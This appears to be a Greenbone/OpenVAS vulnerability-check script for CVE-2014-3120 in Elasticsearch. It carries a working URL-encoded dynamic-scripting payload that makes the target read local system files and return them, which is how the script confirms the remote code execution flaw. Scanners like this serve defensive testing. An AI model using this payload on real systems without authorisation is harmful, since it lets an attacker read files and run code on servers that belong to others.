CPE = "cpe:/a:elastic:elasticsearch";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.105032" );
	script_cve_id( "CVE-2014-3120" );
	script_tag( name: "cvss_base", value: "6.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:P/I:P/A:P" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_name( "Elastisearch Remote Code Execution Vulnerability" );
	script_xref( name: "URL", value: "http://bouk.co/blog/elasticsearch-rce/" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2014-05-22 15:28:00 +0200 (Thu, 22 May 2014)" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2014 Greenbone Networks GmbH" );
	script_dependencies( "gb_elastic_elasticsearch_detect_http.sc", "os_detection.sc" );
	script_require_ports( "Services/www", 9200 );
	script_mandatory_keys( "elastic/elasticsearch/detected" );
	script_tag( name: "impact", value: "An attacker can exploit this issue to execute arbitrary code" );
	script_tag( name: "vuldetect", value: "Send a special crafted HTTP GET request and check the response" );
	script_tag( name: "insight", value: "Elasticsearch has a flaw in its default configuration which makes
  it possible for any webpage to execute arbitrary code on visitors with Elasticsearch installed." );
	script_tag( name: "solution", value: "Ask the vendor for an update or disable 'dynamic scripting'" );
	script_tag( name: "summary", value: "Elasticsearch is prone to a remote-code-execution vulnerability." );
	script_tag( name: "affected", value: "Elasticsearch < 1.2" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_func.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
files = traversal_files();
for file in keys( files ) {
	lf = str_replace( string: files[file], find: "\\\\", replace: "/" );
	lf = str_replace( string: files[file], find: "/", replace: "%2F" );
	ex = "%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22" + "match_all%22%3A%7B%7D%7D%7D%7D%2C%22script_fields%22%3A%7B%22VTTest%22%3A%7B" + "%22script%22%3A%22import%20java.util.*%3B%5Cnimport%20java.io.*%3B%5Cnnew%20" + "Scanner(new%20File(%5C%22%2F" + lf + "%5C%22)).useDelimiter(%5C%22%5C%5C%5C" + "%5CZ%5C%22).next()%3B%22%7D%7D%7D";
	url = "/_search?source=" + ex + "&callback=?";
	req = http_get( item: url, port: port );
	buf = http_send_recv( port: port, data: req, bodyonly: FALSE );
	if(ContainsString( buf, "VTTest" ) && egrep( pattern: file, string: buf )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

